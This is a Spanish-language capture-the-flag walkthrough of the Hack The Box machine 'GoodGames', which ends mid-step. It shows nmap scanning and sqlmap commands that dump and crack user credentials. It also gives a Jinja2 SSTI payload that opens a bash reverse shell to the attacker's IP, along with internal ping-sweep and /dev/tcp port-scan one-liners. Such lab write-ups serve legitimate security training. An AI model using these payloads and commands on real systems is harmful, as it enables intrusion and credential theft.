---
description: '✍️ Autor: TheCyberGeek🔍 Dificultad: Fácil 📅 Fecha de creación: 24/01/2022'
---

# GoodGames

### 🔍 RECONOCIMIENTO

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 10.10.11.130
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (1278).png" alt=""><figcaption></figcaption></figure>

A continuación, realizamos el comando:

```bash
nmap -sC -sV 10.10.11.130
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (1279).png" alt=""><figcaption></figcaption></figure>

Durante el escaneo se identificaron los siguientes puertos abiertos:

* **Puerto 80 (HTTP):** Este puerto generalmente está asociado a servidores web. Si el servicio está ejecutando un servidor web como Apache, Nginx o IIS, es recomendable buscar vulnerabilidades conocidas relacionadas con el software y versiones en uso (por ejemplo, a través de CVEs). Además, es importante realizar pruebas de seguridad en las aplicaciones web que se ejecutan en el servidor, como inyecciones SQL, Cross-Site Scripting (XSS) o vulnerabilidades de escalada de privilegios.

A continuación, se procederá a analizar cada uno de estos servicios en busca de posibles vectores de ataque.

### 🔎 EXPLORACIÓN

Se utiliza el comando:

```bash
sudo nmap -sCV -p80 -v 10.10.11.130
```

para que nos proporcione más información sobre esos puertos específicamente.

<figure><img src="../../.gitbook/assets/image (1280).png" alt=""><figcaption></figcaption></figure>

Accedemos al puerto 80.

<figure><img src="../../.gitbook/assets/image (1281).png" alt=""><figcaption></figcaption></figure>

Es una página de Juegos y tiene un Login vamos a usar entonces SQLMap.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-02-22 100654.png" alt=""><figcaption></figcaption></figure>

Conocer las bases de datos.

```
sqlmap -u http://10.10.11.130 --forms --dbs --batch
```

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Conocer las tablas de la base de datos objetivo.

```
sqlmap -u http://10.10.11.130 --forms -D main --tables --batch
```

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

Conocer las columnas de la tabla de la bases de datos objetivo.

```
sqlmap -u http://10.10.11.130 --forms -D main -T user --columns --batch
```

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Conocer la información que hay en esas columnas.

```bash
sqlmap -u http://10.10.11.130 --forms -D main -T user -C name,id,email,password --dump --batch
```

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Hemos encontrado unas credenciales aunque la contraseña al ser un hash la crackeamos.

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

Después de analizar el sitio web del perfil, encontramos un símbolo de configuración que nos redirige a una URL con un dominio diferente. Como primer paso, registraremos este nuevo dominio en el archivo `/etc/hosts`.

```bash
echo "10.10.11.130 internal-administration.goodgames.htb" >> /etc/hosts
```

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

Nos logueamos con esas credenciales.

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

Con **Wappalyzer** se ejecuta **Python** por lo que parece una vulnerabilidad **SSTI**. Para ello realizamos la comprobación básica.

```
{{ 7 * 7 }}
```

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

Es vulnerable a **SSTI** por lo que realizamos un payload que contiene una Reverse Shell.

```
{{ namespace.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.10.14.14/4444 0>&1"').read() }}
```

Nos ponemos en escucha.

```bash
nc -nlvp 4444
```

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

### 🔐 PRIVILEGIOS

Al estar dentro y ejecutar:

```bash
whoami
```

somos **root.** No somos root de manera oficial.

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

La interfaz de red está conectada al adaptador de red interna con la dirección `172.19.0.2/16`, lo que nos permite comunicarnos con la red interna desde nuestra máquina de ataque a través de la red comprometida.

Para descubrir los hosts en la red interna, utilizamos el siguiente comando en una sola línea para realizar un escaneo de barrido:

```bash
for i in {1..254}; do (ping -c 1 172.19.0.${i} | grep "bytes from" &); done;
```

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

Una vez identificado un objetivo, realizamos un escaneo de puertos con el siguiente comando:

```bash
for port in {1..65535}; do echo > /dev/tcp/172.19.0.1/$port && echo "$port open"; done 2>/dev/null
```

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

Comencé a buscar credenciales de SSH en la máquina y finalmente encontré la carpeta de un usuario dentro del directorio `/home`. Sin embargo, no encontré a `augustus` en el archivo `/etc/passwd`.

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

```bash
ssh-keygen -t rsa -b 4096 -f ./id_rsa

```
